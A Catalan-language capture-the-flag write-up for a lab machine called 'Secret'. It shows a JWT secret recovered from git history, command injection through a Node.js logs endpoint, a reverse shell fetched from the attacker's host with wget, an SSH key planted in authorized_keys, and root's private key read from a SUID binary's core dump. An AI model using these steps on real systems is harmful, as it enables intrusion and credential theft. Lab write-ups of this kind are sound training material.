**Pentester**: @ajaxr3quest  
**Data**: 23-03-2022  
**Màquina**: secret (10.10.11.120)  


### Fingerprinting i enumeració ###

Començem amb un reconeixement per veure contra que ens enfrentem. Per fer-ho utilitzarem nmap. 

Primerament, intentarem enumerar tots els ports TCP a través de un SYN scan (`-sS`), guardant el resultat en format nmap (`-oN`): 

`nmap -sS -p- --min-rate 1000 -n -oN ports 10.10.11.120`

```
Nmap scan report for 10.10.11.120
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

Seguidament mirarem quins serveis hi ha darrere d'aquests ports i quina informació en podem extreure. També ho farem amb nmap.

`nmap -sVC -p22,80,3000 -n -oN enum 10.10.11.120`

```
Nmap scan report for 10.10.11.120
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Amb la informació extreta, toca mirar si algun dels serveis és fàcilment explotable. Podem saber-ho utilitzant https://www.exploit-db.com/ . 
De bones a primeres, sembla que no. 

Després de probar unes quantes contrasenyes per defecte a través de SSH i fallar miserablement, hem decanto per fer un cop d'ull a la pàgina web de la victima: http://10.10.11.120 .


### DUMBDocs ###

Mirem quines tecnologies utilitza la web amb `whatweb` (alternativament, podem tirar del pluggin Wappalyzer).

`whatweb http://10.10.11.120`

```
http://10.10.11.120 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Trastejant per la web veiem que es tracta de una API. Aquesta API ens permet fer varies funcions com ara registrar-nos, loguejar-nos o accedir a una ruta privada (si som admins).<br/><br/>

  

**Revisant el codi font**

Dins la web trobem un enllaç per descarregar-nos el codi font, empaquetat en un zip. 


**Fitxer:** *local-web/routes/auth.js*
```
router.post('/register', async (req, res) => {

    // validation
    const { error } = registerValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if user exists
    const emailExist = await User.findOne({email:req.body.email})
    if (emailExist) return res.status(400).send('Email already Exist')

    // check if user name exist 
    const unameexist = await User.findOne({ name: req.body.name })
    if (unameexist) return res.status(400).send('Name already Exist')

    //hash the password
    const salt = await bcrypt.genSalt(10);
    const hashPaswrod = await bcrypt.hash(req.body.password, salt)


    //create a user 
    const user = new User({
        name: req.body.name,
        email: req.body.email,
        password:hashPaswrod
    });

    try{
        const saveduser = await user.save();
        res.send({ user: user.name})
    
    }
    catch(err){
        console.log(err)
    }

});


// login 

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})
```

**Fitxer:** *local-web/routes/private.js*
```
router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

**Fitxer**: *local-web/routes/verifytoken.js*
```
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

Segons la documentació de l'API, les peticions a */api/priv* requereixen de una variable auth-token al apartat HEAD de la petició, la qual ha de estar ben signada (trobem aquesta funcionalitat en el fitxer verifytoken.js).
L'API */api/priv*, apart de deixar-nos probar de craftejar diferents JWT i validar-los, no té massa més cosa.

Cal dir que no solu utilitza git desde la consola, sino tots els següents passos ja no els hauria fet (i no hauria après tantes coses!). Inicialment veig el directori ocult .git, i analitzo el fitxers de forma manual (`ls -lasi` i algun `cat`) per mirar si trobo alguna cosa. Acabo veient el mateix que si fessim `git log`, però res més, sense veure quins fitxers han sofert modificacions i quins no. Pensant que no serà tant sencill, segueixo endevant.


**L'aprenentatge de viure**

1- Li passo a l'API */api/priv* el token JWT que surt a la documentació.  
2- Intento crear un usuari amb nom *theadmin* passant multiples paràmetres repetits (parameter pollution).  
3- Comprovo si la l'API */api/user/register* és vulnerable a NO SQL Injection, ja que s'utilitza mongodb com a BBDD.  
4- Genero un nou usuari per obtenir un token vàlid i poder jugar amb ell. Miro si es comproba bé la signatura del token JWT esborrant algun caràcter i enviant el token a */api/priv*.  
5- Utilitzo l'eina `jwt_tool` (https://github.com/ticarpi/jwt_tool) per buscar alguna vulnerabilitat en el token JWT.  
` python3 jwt_tool.py -rh "auth-token: $TOKEN_USUARI_VALID" -M at -t "http://10.10.11.120:3000/api/priv" `<br/>
6- Probo de recuperar el secret utilitzat per signar els tokens JWT amb `hashcat`.  
`hashcat -m 16500 -a 0 jwt.txt /path/al/diccionari/dic.txt` *intentem buscar la clau utilitzant un diccionari*  
`hashcat -m 16500 -a 3 jwt_ajax.txt` *fem força bruta*  

*Lectura interesant sobre tokens JWT:* https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens 


Finalment, una mica ofuscat, faig uns passos enrrere i torno a revisar el maleït git. 
Utilitzant la comanda `git log`, obtenim una vista ràpida dels diferents commits que ha tingut el repositori:

`git log`

```
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
```


El commit *67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78* sembla interessant. Per veure els diferents canvis que ha sofert el fitxer .env, utilitzarem la comanda `git log -p -- .env` (`-p`: ens permet veure els patches aplicats al fitxer en qüestió)


`git log -p -- .env`

```
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQ... (és molt llarg, ja t'aviso)
+TOKEN_SECRET = secret
```

D'aquesta forma obtenim el TOKEN_SECRET i ja podrem firmar els tokens amb el contingut que volguem en els payloads.  


**Command injection i les desventures de JWT**
 
Utilitzarem la web https://jwt.io/ per crear un token JWT amb el secret obtingut:

```
{
  "_id": "622fb7580831bd045ed5c5cb",
  "name": "theadmin",
  "email": "ajax@r3quest.com",
  "iat": 1647294407
}
```
 
Amb aquest token, enviarem una petició GET a travès de curl a la API victima:

`curl  -X GET http://10.10.11.120:3000/api/priv/ -H "auth-token: $TOKEN_JWT" `

I obtenim de resultat el que esperavem:
```
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Tornant a repasar el codi de private.js, aquest cop li posarem l'ull a la funció *api/logs/*.  
Sembla que el codi té en compte un parametre *file* passat a través de GET i que aquest, és passa directament a una funció exec()... Això té pinta de command injection!  
Per poder explotar-ho tranquilament (i complicar-me la vida), he creat un programa en python anomenat `jwt_request.py`. Aquest programa genera un token JWT vàlid coneixent la clau amb la que es signa i ens permet passar-li el payload que volguem.  
Realment, és podria reutilitzar el token generat anteriorment i pasar-lo a través de un `curl`, ja que el command injection és a travès de un parametre GET, i no pas dins del payload del JWT.  
De totes maneres, tenir eines utils per un futur mai esta de més.  

Utilitzant `jwt_request.py` per saber qui esta executant el NodeJS:

`python jwt_request.py 'whoami'`

```
Sending request:
+   URL: http://10.10.11.120:3000/api/logs?file=a | whoami

Got response with status code [200]: 
"dasith"
```

Mirant al /home del usuari dasith, trobarem el flag del usuari:
  
`python jwt_request.py 'cat /home/dasith/user.txt'`
 

### Post Explotation ###
 
Després de una estona trastejant amb `jwt_request.py`, m'acabo decantant per crear una reverse shell sencilleta escrita en python (`rcli.py`), ja que la victima ja té el python instal·lat.


Montem un servidor HTTP per compartir el fitxer:  
`python3 -m http.server --bind LA_NOSTRA_IP_DE_LA_VPN 8080`


Ens descarreguem la reverse desde la victima:  
`python3 jwt_request.py 'wget http://LA_NOSTRA_IP_DE_LA_VPN:8080/rcli.py `


Ens posem en escolta desde la nostra màquina atacant:  
`nc -lvnp 1234`


Executem la reverse shell desde la victima:  
`python3 jwt_request.py 'python3 rcli.py'`  
 
I voilà! Ja tenim una reverse shell amb l'usuari dasith. Ara tocarà fer la escalada de privilegis. 





### Escalant privilegis ###

Primerament mirem a que ens enfrentem:  
`uname -a`

```Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux```


Enumerem processos actius, aviam si ens podem aprofitar d'algun:

`ps -aux | grep 'root'`

```
root           1  0.0  0.2 104112 11460 ?        Ss   19:07   0:02 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    19:07   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   19:07   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   19:07   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   19:07   0:00 [kworker/0:0H-kblockd]
root           9  0.0  0.0      0     0 ?        I<   19:07   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    19:07   0:00 [ksoftirqd/0]
root          11  0.0  0.0      0     0 ?        I    19:07   0:03 [rcu_sched]
root          12  0.0  0.0      0     0 ?        S    19:07   0:00 [migration/0]
root          13  0.0  0.0      0     0 ?        S    19:07   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        S    19:07   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    19:07   0:00 [kdevtmpfs]
root          16  0.0  0.0      0     0 ?        I<   19:07   0:00 [netns]
root          17  0.0  0.0      0     0 ?        S    19:07   0:00 [rcu_tasks_kthre]
root          18  0.0  0.0      0     0 ?        S    19:07   0:00 [kauditd]
root          19  0.0  0.0      0     0 ?        S    19:07   0:00 [khungtaskd]
root          20  0.0  0.0      0     0 ?        S    19:07   0:00 [oom_reaper]
root          21  0.0  0.0      0     0 ?        I<   19:07   0:00 [writeback]
root          22  0.0  0.0      0     0 ?        S    19:07   0:00 [kcompactd0]
root          23  0.0  0.0      0     0 ?        SN   19:07   0:00 [ksmd]
root          24  0.0  0.0      0     0 ?        SN   19:07   0:00 [khugepaged]
root          70  0.0  0.0      0     0 ?        I<   19:07   0:00 [kintegrityd]
root          71  0.0  0.0      0     0 ?        I<   19:07   0:00 [kblockd]
root          72  0.0  0.0      0     0 ?        I<   19:07   0:00 [blkcg_punt_bio]
root          73  0.0  0.0      0     0 ?        I<   19:07   0:00 [tpm_dev_wq]
root          74  0.0  0.0      0     0 ?        I<   19:07   0:00 [ata_sff]
root          75  0.0  0.0      0     0 ?        I<   19:07   0:00 [md]
root          76  0.0  0.0      0     0 ?        I<   19:07   0:00 [edac-poller]
root          77  0.0  0.0      0     0 ?        I<   19:07   0:00 [devfreq_wq]
root          78  0.0  0.0      0     0 ?        S    19:07   0:00 [watchdogd]
root          81  0.0  0.0      0     0 ?        S    19:07   0:00 [kswapd0]
root          82  0.0  0.0      0     0 ?        S    19:07   0:00 [ecryptfs-kthrea]
root          84  0.0  0.0      0     0 ?        I<   19:07   0:00 [kthrotld]
root          85  0.0  0.0      0     0 ?        S    19:07   0:00 [irq/24-pciehp]
root          86  0.0  0.0      0     0 ?        S    19:07   0:00 [irq/25-pciehp]
...
root         117  0.0  0.0      0     0 ?        I<   19:07   0:00 [acpi_thermal_pm]
root         118  0.0  0.0      0     0 ?        S    19:07   0:00 [scsi_eh_0]
root         119  0.0  0.0      0     0 ?        I<   19:07   0:00 [scsi_tmf_0]
root         120  0.0  0.0      0     0 ?        S    19:07   0:00 [scsi_eh_1]
root         121  0.0  0.0      0     0 ?        I<   19:07   0:00 [scsi_tmf_1]
root         123  0.0  0.0      0     0 ?        I<   19:07   0:00 [vfio-irqfd-clea]
root         124  0.0  0.0      0     0 ?        I<   19:07   0:00 [ipv6_addrconf]
root         134  0.0  0.0      0     0 ?        I<   19:07   0:00 [kstrp]
root         137  0.0  0.0      0     0 ?        I<   19:07   0:00 [kworker/u3:0]
root         150  0.0  0.0      0     0 ?        I<   19:07   0:00 [charger_manager]
root         192  0.0  0.0      0     0 ?        S    19:07   0:00 [scsi_eh_2]
root         193  0.0  0.0      0     0 ?        I<   19:07   0:00 [cryptd]
root         194  0.0  0.0      0     0 ?        I<   19:07   0:00 [scsi_tmf_2]
root         195  0.0  0.0      0     0 ?        S    19:07   0:00 [scsi_eh_3]
root         196  0.0  0.0      0     0 ?        I<   19:07   0:00 [scsi_tmf_3]
root         199  0.0  0.0      0     0 ?        S    19:07   0:00 [scsi_eh_4]
...
root         237  0.0  0.0      0     0 ?        S    19:07   0:00 [irq/16-vmwgfx]
root         239  0.0  0.0      0     0 ?        I<   19:07   0:00 [scsi_tmf_12]
root         240  0.0  0.0      0     0 ?        I<   19:07   0:00 [ttm_swap]
root         242  0.0  0.0      0     0 ?        S    19:07   0:00 [scsi_eh_13]
root         244  0.0  0.0      0     0 ?        I<   19:07   0:00 [scsi_tmf_13]
...
root         316  0.0  0.0      0     0 ?        I<   19:07   0:00 [kworker/0:1H-kblockd]
root         327  0.0  0.0      0     0 ?        I<   19:07   0:00 [kdmflush]
root         329  0.0  0.0      0     0 ?        I<   19:07   0:00 [kdmflush]
root         360  0.0  0.0      0     0 ?        I<   19:07   0:00 [raid5wq]
root         414  0.0  0.0      0     0 ?        S    19:07   0:00 [jbd2/dm-0-8]
root         415  0.0  0.0      0     0 ?        I<   19:07   0:00 [ext4-rsv-conver]
root         475  0.0  0.4  68880 18788 ?        S<s  19:07   0:01 /lib/systemd/systemd-journald
root         504  0.0  0.1  21380  5404 ?        Ss   19:07   0:00 /lib/systemd/systemd-udevd
root         559  0.0  0.0      0     0 ?        I<   19:07   0:00 [nfit]
root         672  0.0  0.0      0     0 ?        I<   19:07   0:00 [kaluad]
root         673  0.0  0.0      0     0 ?        I<   19:07   0:00 [kmpath_rdacd]
root         674  0.0  0.0      0     0 ?        I<   19:07   0:00 [kmpathd]
root         675  0.0  0.0      0     0 ?        I<   19:07   0:00 [kmpath_handlerd]
root         676  0.0  0.4 280200 17992 ?        SLsl 19:07   0:01 /sbin/multipathd -d -s
root         691  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop0]
root         692  0.0  0.0      0     0 ?        S    19:07   0:00 [jbd2/sda2-8]
root         693  0.0  0.0      0     0 ?        I<   19:07   0:00 [ext4-rsv-conver]
root         694  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop1]
root         695  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop2]
root         696  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop3]
root         697  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop4]
root         698  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop5]
root         699  0.0  0.0      0     0 ?        S<   19:07   0:00 [loop6]
root         725  0.0  0.2  47540 10344 ?        Ss   19:07   0:00 /usr/bin/VGAuthService
root         726  0.1  0.2 237764  8224 ?        Ssl  19:07   0:16 /usr/bin/vmtoolsd
root         832  0.0  0.1 235680  7504 ?        Ssl  19:07   0:00 /usr/lib/accountsservice/accounts-daemon
root         841  0.0  0.4  29076 17932 ?        Ss   19:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         845  0.0  0.0   7204  3316 ?        Ss   19:07   0:00 /usr/sbin/cron -f
root         849  0.0  0.7 633640 29536 ?        Ssl  19:07   0:02 /usr/lib/snapd/snapd
root         851  0.0  0.1  16476  5868 ?        Ss   19:07   0:00 /lib/systemd/systemd-logind
root         854  0.0  0.2 392556 12044 ?        Ssl  19:07   0:00 /usr/lib/udisks2/udisksd
root         868  0.0  0.1  12176  7000 ?        Ss   19:07   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         912  0.0  0.1 232716  6820 ?        Ssl  19:07   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         921  0.0  0.0  55280  1496 ?        Ss   19:07   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         950  0.0  0.0   5828  1852 tty1     Ss+  19:07   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1218  0.0  0.0      0     0 ?        I    19:22   0:10 [kworker/0:0-events]
root        1331  0.0  0.0      0     0 ?        I    20:13   0:00 [kworker/u2:2-events_power_efficient]
root       26189  0.0  0.0      0     0 ?        I    20:58   0:00 [kworker/u2:0-events_power_efficient]
root       89130  0.0  0.0      0     0 ?        I    21:51   0:00 [kworker/0:2-cgroup_destroy]
dasith     89217  0.0  0.0   6432   724 ?        S    22:26   0:00 grep root
```


Busquem archius amb suid:

`$ find / -perm -u=s -type f 2>/dev/null`

```
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
```

L'executable */opt/count*  sembla un script fet a mà. Anem a analitzar el codi font */opt/code.c* aviam si ens en podem aprofitar.  
En aquest punt, em quedo bastant bloquejat ja que el codi en si no hem sembla insegur. Inicialment l'unic que hem crida l'atenció és la crida setuid(getuid()). Intento obtenir el contingut del fitxer que llegeix el programa a travès de `gdb`, però encertadament, hi han certs mecanismes que m'inpedeixen debuggar correctament un binari amb suid.  
Després de analitzar varies vegades el codi, començo a buscar altres alternatives.  
Finalment trobo l'error que puc aprofitar, que trobem en l'apartat del codi: `prctl(PR_SET_DUMPABLE, 1)`. Aquesta instrucció permet que és generin core dumps quan l'executable peti.  

**Fitxer:** *opt/code.c*

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}

```


*Nota:* Després de varis intents amb la reverse shell de python, acabo creant una clau ssh per afegir-la al usuari dasith i aixi poder-me connectar per ssh (aprofitant que té el port SSH obert). Ho faig perque la reverse shell em donava problemes a l'hora de executar */opt/count*. 

Creem una clau ssh:  
`ssh-keygen -f secret -P 'contrasenya'`

Creem el directori *.ssh* si no existeix:  
`mkdir /home/dasith/.ssh/`

Creem/afegim al fitxer authorized_keys la nostra clau publica, que ens permetrà connectar-nos a través de ssh amb l'usuari dasith:  
`echo $CONTINGUT_SECRET.PUB >>  /home/dasith/.ssh/authorized_keys`

Ens connectem a través de ssh utilitzant la clau creada:  
`ssh -i secret dasith@10.10.11.120`

Enumero el contingut del directori root aprofitant el programa */opt/count*:  
`echo '/root/' | ./count`
```
Enter source file/directory name: -rw-r--r--	.viminfo
drwxr-xr-x	..
-rw-r--r--	.bashrc
drwxr-xr-x	.local
drwxr-xr-x	snap
lrwxrwxrwx	.bash_history
drwx------	.config
drwxr-xr-x	.pm2
-rw-r--r--	.profile
drwxr-xr-x	.vim
drwx------	.
drwx------	.cache
-r--------	root.txt
drwxr-xr-x	.npm
drwx------	.ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]: $ 
```

Mirem si root té alguna clau privada per connectar-se a través de ssh com a root:

`echo '/root/.ssh/' | ./count`

```
Enter source file/directory name: drwx------	..
-rw-------	authorized_keys
-rw-------	id_rsa
drwx------	.
-rw-r--r--	id_rsa.pub

Total entries       = 5
Regular files       = 3
Directories         = 2
Symbolic links      = 0
```

Seguidament, executem el programa pasant-li com a parametre el fitxer del qual root té accès i en volem saber el contingut. En aquest cas, la clau privada de root:

```
 ./count 
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
```

En aquest punt, tinguent el programa encara en execució, fem `Control+\` per abortar el programa amb un core dump. Aquest core dump és guardarà per defecte a */var/crash*, ja que el sistema victima és un Ubuntu.
Dins la carpeta */var/crash*, utilitzarem apport per poder debuggar el core dump:

`apport-unpack nom_crash.crash /path/on/ho/exportem/`

Apport ens genera la següent estructura:

```
Architecture  Date           ExecutablePath       ProblemType  ProcCwd      ProcMaps    Signal  UserGroups
CoreDump      DistroRelease  ExecutableTimestamp  ProcCmdline  ProcEnviron  ProcStatus  Uname   _LogindSession
```

Simplement executant strings contra el *CoreDump*, podrem obtenir el contingut del fitxer que estavem llegint quan s'ha produit l'excepció:

`strings CoreDump`

```
CORE
CORE
count
./count 
IGISCORE
CORE
ELIFCORE
/opt/count
/opt/count
/opt/count
/opt/count
/opt/count
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
CORE
 a file? [y/N]: 
l characters = 2////////////////
ile? [y/N]: 
LINUX
 a file? [y/N]: 
l characters = 2////////////////
ile? [y/N]: 
TUUU
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
readdir
fopen
closedir
__isoc99_scanf
strncpy
__stack_chk_fail
putchar
fgetc
strlen
prctl
getchar
fputs
...
...
/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjE...                  <---PREMI!
```

D'aquesta forma, obtenim el contingut de la clau privada de root. Copiant la clau privada a la nostra màquina i ja serem root, poguent aixi llegir el flag que ens faltava.
